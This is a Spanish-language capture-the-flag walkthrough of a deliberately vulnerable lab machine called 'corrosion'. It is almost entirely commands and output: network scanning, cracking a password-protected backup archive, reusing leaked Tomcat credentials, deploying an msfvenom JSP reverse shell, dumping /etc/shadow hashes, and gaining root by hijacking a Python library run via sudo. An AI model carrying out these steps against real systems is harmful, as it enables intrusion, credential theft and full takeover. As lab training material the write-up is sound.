# Instalar maquina poner en modo puente

## Buscar la ip

```bash
sudo netdiscover -r 192.168.0.0/24
```
Vemos la ip:
192.168.0.23    08:00:27:9b:a7:19      6     360  PCS Systemtechnik GmbH   

```bash
sudo nmap -Pn -v 192.168.0.23
```

Servicios que nos da son estos:

```plaintext
PORT   STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:9B:A7:19 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```


## Buscaremos directorios vulnerables u ocultos

```bash
dirb http://192.168.0.23:8080/ -X .php,.zip 
```
```plaintext
START_TIME: Mon Mar 17 21:04:36 2025
URL_BASE: http://192.168.0.23:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php,.zip) | (.php)(.zip) [NUM = 2]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.0.23:8080/ ----
+ http://192.168.0.23:8080/backup.zip (CODE:200|SIZE:33723)                                                                       
                                                                                                                                  
-----------------
END_TIME: Mon Mar 17 21:04:54 2025
DOWNLOADED: 9224 - FOUND: 1
```

## Encontramos un archivo oculto lo descargamos


1. Descargamos

```bash
wget http://192.168.0.23:8080/backup.zip
```

2. Descomprimimos
```bash
unzip backup.zip
```
(NO podemos descomprimir el archivo por que esta protegido por una contraseña)

3. Hacemos un ataque de fuerza bruta para conseguir la contresaña utilizamos rockyou.txt

```bash
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
```
Contraseña: @administrator_hi5

4. Ahora si descomprimimos con esa contraseña

```bash
unzip backup.zip
```


```plaintext
Archive:  corrosion2/backup.zip
[corrosion2/backup.zip] catalina.policy password: 
  inflating: catalina.policy         
  inflating: context.xml             
  inflating: catalina.properties     
  inflating: jaspic-providers.xml    
  inflating: jaspic-providers.xsd    
  inflating: logging.properties      
  inflating: server.xml              
  inflating: tomcat-users.xml        
  inflating: tomcat-users.xsd        
  inflating: web.xml  
``` 
Encontramos todos estos archivos

## Buscamos credenciales de usuarios

1. En el archivo tomcat-users.xml , encontramos credenciales de un usuario

```plaintext
<role rolename="manager-gui"/>
<user username="manager" password="melehifokivai" roles="manager-gui"/>

<role rolename="admin-gui"/>
<user username="admin" password="melehifokivai" roles="admin-gui, manager-gui"/>
```

## Introducir una reverse shell

1. Con la credenciales descubiertas iniciamos sesión en http://192.168.0.23:8080/manager/html

Usuario: admin
Contraseña: melehifokivai

2. Ahora subimos un archivo el cual nos genera una reverse shell

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.18 LPORT=5555 -f war -o revshell.war
```
3. Subimos en arhcivo generado a la web 

Podremos acceder a esta pagina: http://192.168.0.23:8080/revshell/

Y atendríamos una reverse shell

## Conseguir escalar privilegios
1. Podemos utilizar la shell para introducicr comandos
Podemos ir al /home y ver los usuarios que hay /randy y /jaye.

2. Encontramos en el usuarios /randy estos dos archivos

```plaintext
cat user.txt
ca73a018ae6908a7d0ea5d1c269ba4b6
cat note.txt
Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know
that I changed your permissions for your home directory. You won't be able to remove or add files for now.

I will change these permissions later on.

See you next Monday randy!
```
3. Intentamos entrar por ssh al usuario: jaye conn la contraseña: melehifokivai

```bash
ssh jaye@192.168.0.18
```

Dentro encontramos este archivo que es interesante look 
(Con este archivo podremos mostrar los archivo de configuracion que no podemos ver simplemente con un cat)

```plaintext
$ LFILE=/etc/shadow
$ ./look '' $LFILE
root:$6$fHvHhNo5DWsYxgt0$.3upyGTbu9RjpoCkHfW.1F9mq5dxjwcqeZl0KnwEr0vXXzi7Tld2lAeYeIio/9BFPjUCyaBeLgVH1yK.5OR57.:18888:0:99999:7:::
daemon:*:18858:0:99999:7:::
bin:*:18858:0:99999:7:::
sys:*:18858:0:99999:7:::
sync:*:18858:0:99999:7:::
games:*:18858:0:99999:7:::
man:*:18858:0:99999:7:::
lp:*:18858:0:99999:7:::
mail:*:18858:0:99999:7:::
news:*:18858:0:99999:7:::
uucp:*:18858:0:99999:7:::
proxy:*:18858:0:99999:7:::
backup:*:18858:0:99999:7:::
list:*:18858:0:99999:7:::
irc:*:18858:0:99999:7:::
gnats:*:18858:0:99999:7:::
nobody:*:18858:0:99999:7:::
systemd-network:*:18858:0:99999:7:::
systemd-resolve:*:18858:0:99999:7:::
systemd-timesync:*:18858:0:99999:7:::
messagebus:*:18858:0:99999:7:::
syslog:*:18858:0:99999:7:::
_apt:*:18858:0:99999:7:::
tss:*:18858:0:99999:7:::
uuidd:*:18858:0:99999:7:::
tcpdump:*:18858:0:99999:7:::
avahi-autoipd:*:18858:0:99999:7:::
usbmux:*:18858:0:99999:7:::
rtkit:*:18858:0:99999:7:::
dnsmasq:*:18858:0:99999:7:::
cups-pk-helper:*:18858:0:99999:7:::
speech-dispatcher:!:18858:0:99999:7:::
avahi:*:18858:0:99999:7:::
kernoops:*:18858:0:99999:7:::
saned:*:18858:0:99999:7:::
nm-openvpn:*:18858:0:99999:7:::
hplip:*:18858:0:99999:7:::
whoopsie:*:18858:0:99999:7:::
colord:*:18858:0:99999:7:::
geoclue:*:18858:0:99999:7:::
pulse:*:18858:0:99999:7:::
gnome-initial-setup:*:18858:0:99999:7:::
gdm:*:18858:0:99999:7:::
sssd:*:18858:0:99999:7:::
randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::
systemd-coredump:!!:18886::::::
tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPfrBNC1:18888:0:99999:7:::
sshd:*:18887:0:99999:7:::
jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::
```
4. Podremos descibrar los hash de los tres usuarios

(Guardamos un hash en un archivo llamado hash.txt) y con este comando lo desciframos.
```bash
john -- wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Saldrá: 07051986randy

5. Entramos por ssh al usuario randy 

```bash
ssh randy@192.168.0.18
```

```plaintext
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py
```
(No dice que tengremos que ejecutar el archivo randombase64.py)


6. Vemos que hay dentras de este archivo

```bash
cat /home/randy/randombase64.py
```

```plaintext
import base64

message = input("Enter your string: ")
message_bytes = message.encode('ascii')
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode('ascii')

print(base64_message)
```
7. Buscamos donde esta base64.py y editamos para meter un bash

```bash
locate base64.py
```

```bash
nano /usr/lib/python3.8/base64.py
```
Añadimos estas dos lineas en el codigo:

```plaintext
import os

os.system("/bin/bash")
```
8. Ejecutar el archivo con permisos sudo para consegir la shell de root

```bash
sudo /usr/bin/python3.8 /home/randy/randombase64.py
```

## Consegido acceso al root

Podremos ver todos los archivo que puede ver root

```plaintext

root@corrosion:/home/randy# cd                                                             
root@corrosion:~# ls -la                                                                   
total 44                                                                                   
drw-------  5 root root 4096 Sep 20  2021 .                                                
drwxr-xr-x 20 root root 4096 Sep 16  2021 ..                                               
-rw-r--r--  1 root root    5 Sep 20  2021 .bash_history                                    
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc                                          
drwx------  2 root root 4096 Aug 19  2021 .cache                                           
drwxr-xr-x  3 root root 4096 Sep 16  2021 .local                                           
-rw-r--r--  1 root root  161 Dec  5  2019 .profile                                         
-rw-------  1 root root    0 Sep 17  2021 .python_history                                  
-rw-r--r--  1 root root   33 Sep 17  2021 root.txt                                         
-rw-r--r--  1 root root   66 Sep 16  2021 .selected_editor                                                          
drwxr-xr-x  3 root root 4096 Sep 16  2021 snap                                                                      
-rw-r--r--  1 root root  181 Sep 17  2021 .wget-hsts                                                                
root@corrosion:~# cat root.txt                                                                                      
2fdbf8d4f894292361d6c72c8e833a4b  
```





